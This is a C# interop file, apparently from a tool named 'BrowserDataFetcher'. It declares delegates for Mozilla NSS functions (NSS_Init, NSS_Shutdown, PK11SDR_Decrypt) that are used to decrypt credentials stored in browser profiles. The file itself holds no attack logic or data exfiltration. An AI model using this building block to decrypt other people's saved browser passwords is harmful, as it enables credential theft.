namespace BrowserDataFetcher
{
    using System;
    using System.Runtime.InteropServices;

    /// <summary>
    /// The Network Security Services developed by Mozilla Foundation.
    /// </summary>
    internal sealed class Nss3
    {
        /// <summary>
        /// Data structure and template for encoding the result of an SDR operation.
        /// </summary>
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        /// <summary>
        /// initializes NSS.
        /// </summary>
        /// <remarks>
        /// This is more flexible than <c>NSS_Init</c>, <c>NSS_InitReadWrite</c>, and <c>NSS_NoDB_Init</c>.
        /// </remarks>
        /// <param name="sDirectory">
        /// The directory where the certificate, key, and module databases live.
        /// </param>
        /// <returns>
        /// Returns <c>SECSuccess</c> on success, or <c>SECFailure</c> on failure.
        /// </returns>
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string sDirectory);

        /// <summary>
        /// Closes the key and certificate databases that were opened by <c>NssInit</c>.
        /// </summary>
        /// <remarks>
        /// Use <c>PR_GetError</c> to obtain the error code.
        /// </remarks>
        /// <returns>
        /// If successful, <c>SECSuccess</c>. If unsuccessful, <c>SECFailure</c>.
        /// </returns>
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        /// <summary>
        /// Decrypt a block of data produced by <c>PK11SDR_Encrypt</c>.
        /// The key used is identified by the key id field within the input.
        /// </summary>
        /// <param name="tsData">
        /// The data of an SDR operation.
        /// </param>
        /// <param name="tsResult">
        /// The result of an SDR operation.
        /// </param>
        /// <param name="iContent">
        /// The content.
        /// </param>
        /// <returns>
        /// The key.
        /// </returns>
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
    }
}